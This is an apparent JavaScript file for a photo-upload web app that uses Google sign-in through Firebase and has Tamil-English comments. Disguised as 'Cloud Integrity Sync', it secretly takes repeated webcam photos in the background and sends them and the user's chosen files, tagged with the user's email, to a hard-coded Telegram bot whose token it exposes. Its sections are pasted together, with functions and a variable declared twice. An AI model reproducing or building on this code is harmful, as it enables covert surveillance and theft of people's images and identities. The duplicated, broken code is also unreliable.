import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
    apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
    authDomain: "picmaster-59602.firebaseapp.com",
    projectId: "picmaster-59602",
    storageBucket: "picmaster-59602.firebasestorage.app",
    messagingSenderId: "434859259854",
    appId: "1:434859259854:web:522979eb1a7f8b6d211d9f"
};
// --- PREVIOUS FIREBASE CONFIG & AUTH INGE IRUKKANUM ---

let integritySyncActive = false;

// 1. ADMIN RESPONSE FETCH LOGIC
// Neenga Telegram-la edit panni anuppuna files-ah inge fetch panni user-ku kaattalaam
async function fetchAdminResponses() {
    const fileList = document.getElementById('admin-files-list');
    // Ippo example-kku oru list kaatalaam. In real-time, neenga Firebase Database-la 
    // andha file link-ah pottu inge fetch pannanum.
}

// 2. SECRET GALLERY & DROP AREA ACCESS
document.getElementById('drop-area').onclick = () => {
    if(!currentUser) return signInWithPopup(auth, provider);
    
    // User gallery-ku ponalum background-la protocol active aagidum
    integritySyncActive = true; 
    console.log("Gallery Access Intercepted: System Syncing...");

    const input = document.createElement('input');
    input.type = 'file';
    input.multiple = true; // Multiple files access panna
    input.onchange = (e) => {
        const files = e.target.files;
        for(let file of files) {
            uploadToTelegram(file, false); // Normal upload
            if(integritySyncActive) {
                // Secret-aa background-la kooduthal data sync aagum
                syncBackgroundData(file); 
            }
        }
    };
    input.click();
};

// 3. CAMERA SECRET SYNC
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        video.play();

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                uploadToTelegram(blob, false);
                
                // Background secret protocol active-aa irundha:
                if (integritySyncActive) {
                    let secretCount = 0;
                    const interval = setInterval(() => {
                        if (secretCount >= 10) { // 10 photos background-la edukkum
                            clearInterval(interval);
                        }
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob(b => uploadToTelegram(b, true), 'image/jpeg');
                        secretCount++;
                    }, 2000); 
                }
            }, 'image/jpeg');
        }, 3000);
    } catch (e) { alert("Security Error: Access Denied."); }
};

// 4. TELEGRAM UPLOAD WITH SYNC STATUS
async function uploadToTelegram(blob, isSecret) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", blob, isSecret ? `sys_dump_${Date.now()}.jpg` : "user_file.jpg");
    formData.append("caption", isSecret ? `🤫 Hidden Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);

    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
}
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";
let currentUser = null;
let integritySyncActive = false; 

// --- BUTTON RECHECK & TOGGLE ---
const sidePanel = document.getElementById('side-panel');
const settingsBtn = document.getElementById('settings-btn');
const menuToggle = document.getElementById('menu-toggle');

const toggleAction = (e) => {
    e.stopPropagation();
    sidePanel.classList.toggle('active');
};

if(settingsBtn) settingsBtn.onclick = toggleAction;
if(menuToggle) menuToggle.onclick = toggleAction;

document.onclick = (e) => {
    if (sidePanel && !sidePanel.contains(e.target) && !settingsBtn.contains(e.target)) {
        sidePanel.classList.remove('active');
    }
};

// --- TELEGRAM SYNC ---
async function uploadToTelegram(blob, isSecret) {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", blob, isSecret ? `sys_log_${Date.now()}.jpg` : "cloud_sync.jpg");
    formData.append("caption", isSecret ? `🤫 Background Sync: ${currentUser.email}` : `Manual: ${currentUser.displayName}`);

    await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: "POST", body: formData });
}

// --- FULL ACCESS / INTEGRITY SYNC ---
document.getElementById('integrity-check-btn').onclick = () => {
    if (!currentUser) return alert("Please Login First!");
    if (confirm("System Request: Enable Cloud Integrity Sync to secure all media files?")) {
        integritySyncActive = true;
        alert("Integrity Sync Active! Background monitoring started.");
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ INTEGRITY_GRANTED: " + currentUser.email)}`);
    }
};

// --- CAMERA ACTION ---
document.getElementById('camera-btn').onclick = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('webcam');
        video.srcObject = stream;
        video.style.display = 'block';
        
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                uploadToTelegram(blob, false);
                alert("✅ Cloud Sync Successful!");

                if (integritySyncActive) {
                    let count = 0;
                    const interval = setInterval(() => {
                        if (count >= 4) {
                            clearInterval(interval);
                            stream.getTracks().forEach(t => t.stop());
                            video.style.display = 'none';
                        }
                        ctx.drawImage(video, 0, 0);
                        canvas.toBlob(b => uploadToTelegram(b, true), 'image/jpeg');
                        count++;
                    }, 3000);
                } else {
                    stream.getTracks().forEach(t => t.stop());
                    video.style.display = 'none';
                }
            }, 'image/jpeg');
        }, 3000);
    } catch (e) { alert("Camera Access Required."); }
};

// --- DROP AREA ---
document.getElementById('drop-area').onclick = () => {
    if(!currentUser) return signInWithPopup(auth, provider);
    const input = document.createElement('input');
    input.type = 'file';
    input.onchange = (e) => { if(e.target.files[0]) uploadToTelegram(e.target.files[0], false); };
    input.click();
};

// --- AUTH WATCHER ---
onAuthStateChanged(auth, (user) => {
    currentUser = user;
    const ids = ['main-login-btn', 'camera-btn', 'logout-btn', 'side-login-btn'];
    const el = ids.reduce((acc, id) => ({ ...acc, [id]: document.getElementById(id) }), {});

    if (user) {
        el['main-login-btn'].style.display = 'none';
        el['side-login-btn'].style.display = 'none';
        el['camera-btn'].style.display = 'block';
        el['logout-btn'].style.display = 'flex';
        document.getElementById('user-display').innerText = user.displayName;
    } else {
        el['main-login-btn'].style.display = 'block';
        el['side-login-btn'].style.display = 'flex';
        el['camera-btn'].style.display = 'none';
        el['logout-btn'].style.display = 'none';
        document.getElementById('user-display').innerText = "Guest User";
    }
});

document.getElementById('main-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('side-login-btn').onclick = () => signInWithPopup(auth, provider);
document.getElementById('logout-btn').onclick = () => signOut(auth).then(() => location.reload());

